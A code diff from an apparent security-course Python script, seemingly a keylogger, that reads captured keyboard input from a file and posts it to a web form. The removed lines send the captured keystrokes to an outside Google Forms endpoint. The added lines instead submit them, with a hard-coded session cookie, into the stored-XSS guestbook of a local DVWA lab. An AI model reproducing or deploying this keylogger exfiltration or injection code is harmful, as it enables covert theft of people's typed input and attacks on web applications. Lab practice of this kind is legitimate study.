@@ -9,11 +9,12 @@ os.system("python3 '/home/dakendall/Documents/ITP270_FALL2022/ITP270/Python Scri
 time.sleep(1)
 
 def send_request():
+    cookies = {'PHPSESSID':'t641pkf0pqmi3j262q9t84j766', 'security': 'low'}
+    url='http://127.0.0.1/dvwa/vulnerabilities/xss_s/'
     form_input = open("/home/dakendall/Documents/ITP270_FALL2022/ITP270/Python Scripts/Security Scripts/keyboard_input.txt")
     form_send = form_input.read()
-    url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSe29PKiw9gmJ2lvh9_yrY_EvM1pVVrcuMsKnMOhd7PIF6gO4A/formResponse'
-    form_data = {'entry.839337160':f"'{form_send}'"}
-    r = requests.post(url, data=form_data)
+    form_data = {'txtName':'Vader', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}
+    r = requests.post(url, cookies=cookies, data=form_data)
 
 def interval():
     global startlog
